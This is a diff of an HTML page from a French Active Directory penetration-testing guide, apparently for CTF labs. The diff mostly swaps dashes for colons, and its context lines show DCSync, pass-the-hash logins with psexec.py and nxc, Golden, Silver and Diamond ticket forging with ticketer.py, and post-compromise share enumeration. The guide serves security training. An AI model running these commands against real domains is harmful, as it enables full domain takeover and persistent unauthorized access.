@@ -858,12 +858,12 @@
   <a href="#61-dcsync" class="md-nav__link">
     <span class="md-ellipsis">
       
-        6.1 — DCSync
+        6.1 : DCSync
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="6.1 — DCSync">
+    <nav class="md-nav" aria-label="6.1 : DCSync">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
@@ -930,7 +930,7 @@
   <a href="#62-se-connecter-en-tant-quadministrator" class="md-nav__link">
     <span class="md-ellipsis">
       
-        6.2 — Se connecter en tant qu'Administrator
+        6.2 : Se connecter en tant qu'Administrator
       
     </span>
   </a>
@@ -941,12 +941,12 @@
   <a href="#63-golden-ticket" class="md-nav__link">
     <span class="md-ellipsis">
       
-        6.3 — Golden Ticket
+        6.3 : Golden Ticket
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="6.3 — Golden Ticket">
+    <nav class="md-nav" aria-label="6.3 : Golden Ticket">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
@@ -980,7 +980,7 @@
   <a href="#64-silver-ticket" class="md-nav__link">
     <span class="md-ellipsis">
       
-        6.4 — Silver Ticket
+        6.4 : Silver Ticket
       
     </span>
   </a>
@@ -991,7 +991,7 @@
   <a href="#65-diamond-ticket-variante-furtive" class="md-nav__link">
     <span class="md-ellipsis">
       
-        6.5 — Diamond Ticket (variante furtive)
+        6.5 : Diamond Ticket (variante furtive)
       
     </span>
   </a>
@@ -1002,7 +1002,7 @@
   <a href="#66-actions-post-compromission" class="md-nav__link">
     <span class="md-ellipsis">
       
-        6.6 — Actions post-compromission
+        6.6 : Actions post-compromission
       
     </span>
   </a>
@@ -1013,7 +1013,7 @@
   <a href="#67-recapitulatif-la-chaine-complete" class="md-nav__link">
     <span class="md-ellipsis">
       
-        6.7 — Récapitulatif : la chaîne complète
+        6.7 : Récapitulatif : la chaîne complète
       
     </span>
   </a>
@@ -1530,10 +1530,14 @@
   
 
 
-<h1 id="phase-6-compromission-totale">Phase 6 — Compromission Totale<a class="headerlink" href="#phase-6-compromission-totale" title="Permanent link">&para;</a></h1>
+<h1 id="phase-6-compromission-totale">Phase 6 : Compromission Totale<a class="headerlink" href="#phase-6-compromission-totale" title="Permanent link">&para;</a></h1>
 <p>Tu es Domain Admin, ou tu as le droit <strong>DCSync</strong>. C'est la fin de partie.</p>
+<div class="admonition tip">
+<p class="admonition-title">Référence Impacket</p>
+<p>Cette phase repose entièrement sur Impacket : <code>secretsdump.py</code> (DCSync), <code>ticketer.py</code> (Golden Ticket), <code>psexec.py</code> / <code>wmiexec.py</code> (accès Administrator). Référence complète : <a href="../../outils/impacket/">Impacket</a></p>
+</div>
 <hr />
-<h2 id="61-dcsync">6.1 — DCSync<a class="headerlink" href="#61-dcsync" title="Permanent link">&para;</a></h2>
+<h2 id="61-dcsync">6.1 : DCSync<a class="headerlink" href="#61-dcsync" title="Permanent link">&para;</a></h2>
 <h3 id="le-concept">Le concept<a class="headerlink" href="#le-concept" title="Permanent link">&para;</a></h3>
 <p>Tu simules un <strong>contrôleur de domaine secondaire</strong> qui demande une réplication des données. Le DC te répond avec <strong>tous les hashes de tous les comptes du domaine</strong>, y compris <code>Administrator</code> et <code>KRBTGT</code>.</p>
 <div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>Attaquant → &quot;Je suis un DC secondaire, donne-moi les réplications&quot;
@@ -1598,7 +1602,7 @@
 </span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;DOMAIN_SID: </span><span class="nv">$DOMAIN_SID</span><span class="s2">&quot;</span>
 </span></code></pre></div>
 <hr />
-<h2 id="62-se-connecter-en-tant-quadministrator">6.2 — Se connecter en tant qu'Administrator<a class="headerlink" href="#62-se-connecter-en-tant-quadministrator" title="Permanent link">&para;</a></h2>
+<h2 id="62-se-connecter-en-tant-quadministrator">6.2 : Se connecter en tant qu'Administrator<a class="headerlink" href="#62-se-connecter-en-tant-quadministrator" title="Permanent link">&para;</a></h2>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1"># Via psexec (shell SYSTEM)</span>
 </span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>psexec.py<span class="w"> </span>-hashes<span class="w"> </span>:<span class="nv">$ADMIN_HASH</span><span class="w"> </span><span class="nv">$DOMAIN</span>/Administrator@<span class="nv">$DC_IP</span>
 </span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
@@ -1612,7 +1616,7 @@
 </span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span>Administrator<span class="w"> </span>-H<span class="w"> </span><span class="nv">$ADMIN_HASH</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
 </span></code></pre></div>
 <hr />
-<h2 id="63-golden-ticket">6.3 — Golden Ticket<a class="headerlink" href="#63-golden-ticket" title="Permanent link">&para;</a></h2>
+<h2 id="63-golden-ticket">6.3 : Golden Ticket<a class="headerlink" href="#63-golden-ticket" title="Permanent link">&para;</a></h2>
 <h3 id="le-concept_1">Le concept<a class="headerlink" href="#le-concept_1" title="Permanent link">&para;</a></h3>
 <p>Avec le hash NT de <strong>KRBTGT</strong>, tu peux forger un TGT valide pour <strong>n'importe quel compte</strong>, même inexistant, avec <strong>n'importe quels droits</strong>. C'est la persistance totale.</p>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># Forger le Golden Ticket</span>
@@ -1644,8 +1648,8 @@
 <p>Même si tous les mots de passe sont changés après ton départ, ton Golden Ticket reste valide jusqu'à ce que le mot de passe de <strong>KRBTGT soit changé deux fois</strong>. Valide 10 ans par défaut.</p>
 </div>
 <hr />
-<h2 id="64-silver-ticket">6.4 — Silver Ticket<a class="headerlink" href="#64-silver-ticket" title="Permanent link">&para;</a></h2>
-<p>Forger un <strong>TGS</strong> pour un service spécifique — sans passer par le DC.</p>
+<h2 id="64-silver-ticket">6.4 : Silver Ticket<a class="headerlink" href="#64-silver-ticket" title="Permanent link">&para;</a></h2>
+<p>Forger un <strong>TGS</strong> pour un service spécifique : sans passer par le DC.</p>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>ticketer.py<span class="w"> </span><span class="se">\</span>
 </span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="w">    </span>-nthash<span class="w"> </span><span class="nv">$SVC_HASH</span><span class="w"> </span><span class="se">\</span>
 </span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="w">    </span>-domain-sid<span class="w"> </span><span class="nv">$DOMAIN_SID</span><span class="w"> </span><span class="se">\</span>
@@ -1657,8 +1661,8 @@
 </span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>mssqlclient.py<span class="w"> </span>-k<span class="w"> </span>Administrator@sql01.entreprise.local
 </span></code></pre></div>
 <hr />
-<h2 id="65-diamond-ticket-variante-furtive">6.5 — Diamond Ticket (variante furtive)<a class="headerlink" href="#65-diamond-ticket-variante-furtive" title="Permanent link">&para;</a></h2>
-<p>Modifie le PAC d'un TGT légitime — moins détectable.</p>
+<h2 id="65-diamond-ticket-variante-furtive">6.5 : Diamond Ticket (variante furtive)<a class="headerlink" href="#65-diamond-ticket-variante-furtive" title="Permanent link">&para;</a></h2>
+<p>Modifie le PAC d'un TGT légitime : moins détectable.</p>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>ticketer.py<span class="w"> </span><span class="se">\</span>
 </span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="w">    </span>-nthash<span class="w"> </span><span class="nv">$KRBTGT_HASH</span><span class="w"> </span><span class="se">\</span>
 </span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="w">    </span>-domain-sid<span class="w"> </span><span class="nv">$DOMAIN_SID</span><span class="w"> </span><span class="se">\</span>
@@ -1668,7 +1672,7 @@
 </span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="w">    </span>Administrator
 </span></code></pre></div>
 <hr />
-<h2 id="66-actions-post-compromission">6.6 — Actions post-compromission<a class="headerlink" href="#66-actions-post-compromission" title="Permanent link">&para;</a></h2>
+<h2 id="66-actions-post-compromission">6.6 : Actions post-compromission<a class="headerlink" href="#66-actions-post-compromission" title="Permanent link">&para;</a></h2>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c1"># Chercher les flags restants avec Administrator</span>
 </span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>-u<span class="w"> </span>Administrator<span class="w"> </span>-H<span class="w"> </span><span class="nv">$ADMIN_HASH</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--shares
 </span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>-u<span class="w"> </span>Administrator<span class="w"> </span>-H<span class="w"> </span><span class="nv">$ADMIN_HASH</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-M<span class="w"> </span>spider_plus
@@ -1677,7 +1681,7 @@
 </span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>lookupsid.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="nv">$PWD</span>@<span class="nv">$DC_IP</span><span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head
 </span></code></pre></div>
 <hr />
-<h2 id="67-recapitulatif-la-chaine-complete">6.7 — Récapitulatif : la chaîne complète<a class="headerlink" href="#67-recapitulatif-la-chaine-complete" title="Permanent link">&para;</a></h2>
+<h2 id="67-recapitulatif-la-chaine-complete">6.7 : Récapitulatif : la chaîne complète<a class="headerlink" href="#67-recapitulatif-la-chaine-complete" title="Permanent link">&para;</a></h2>
 <div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>RECONNAISSANCE
 </span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>  Nmap → identifier DC, services ouverts
 </span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>
